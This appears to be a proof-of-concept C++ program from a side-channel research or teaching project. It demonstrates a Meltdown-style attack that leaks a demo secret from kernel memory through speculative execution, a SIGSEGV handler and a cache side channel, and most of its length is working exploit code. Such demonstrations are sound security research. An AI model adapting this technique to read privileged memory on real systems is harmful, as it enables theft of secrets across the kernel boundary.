/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <algorithm>
#include <array>
#include <cstring>
#include <fstream>
#include <iostream>
#include <string>
#include <tuple>
#include <vector>

// TODO(asteinha): Windows, MacOS and vulnerable ARM support.

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if not defined(__x86_64__) and not defined(__i386__)
#  error Unsupported architecture. x86/x86_64 required.
#endif

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"

// Objective: given some control over accesses to the *non-secret* string
// "Hello, world!", construct a program that obtains "It's a s3kr3t!!!" that is
// stored only in the kernel memory.
const char *public_data = "Hello, world!";

// This label is used for shifting the instruction pointer after the instruction
// that caused SIGSEGV. It is defined in the inlined assembler.
extern char afterspeculation [];

// Leaks the byte that is physically located at &text[0] + offset, without
// really loading it. In the abstract machine, and in the code executed by the
// CPU, this function does not load any memory except for what is in the bounds
// of `text`, and local auxiliary data.
//
// Instead, the leak is performed by accessing out-of-bounds during speculative
// execution, speculatively loading data accessible only in the kernel mode.
static char leak_byte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    // Load the kernel memory into the cache to speed up its leakage.
    std::ifstream is("/sys/kernel/kernel_data/length");
    is.get();
    is.close();

    sidechannel.FlushOracle();

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    size_t safe_offset = run % strlen(public_data);
    ForceRead(&isolated_oracle[static_cast<size_t>(data[safe_offset])]);

    // Access attempt to the kernel memory. This does not succeed
    // architecturally and kernel sends SIGSEGV instead.
    ForceRead(&isolated_oracle[static_cast<size_t>(data[offset])]);

    // SIGSEGV signal handler moves the instruction pointer to the following
    // label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(static_cast<size_t>(data[safe_offset]));
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void sigsegv(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGSEGV signal handler.
  // Moves the instruction pointer to the "afterspeculation" label.
  ucontext_t *ucontext = (ucontext_t *)context;
#ifdef __x86_64__
  ucontext->uc_mcontext.gregs[REG_RIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#else
  ucontext->uc_mcontext.gregs[REG_EIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#endif
}

static void set_signal() {
  struct sigaction act;
  act.sa_sigaction = sigsegv;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGSEGV, &act, NULL);
}

int main() {
  size_t private_data, private_length;
  std::ifstream in("/sys/kernel/kernel_data/address");
  if (in.fail()) {
    std::cerr << "SYSFS module not loaded or not running as root." << std::endl;
    exit(EXIT_FAILURE);
  }
  in >> std::hex >> private_data;
  in.close();

  in.open("/sys/kernel/kernel_data/length");
  in >> std::dec >> private_length;
  in.close();

  set_signal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset =
      reinterpret_cast<const char *>(private_data) - public_data;
  for (size_t i = 0; i < private_length; ++i) {
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
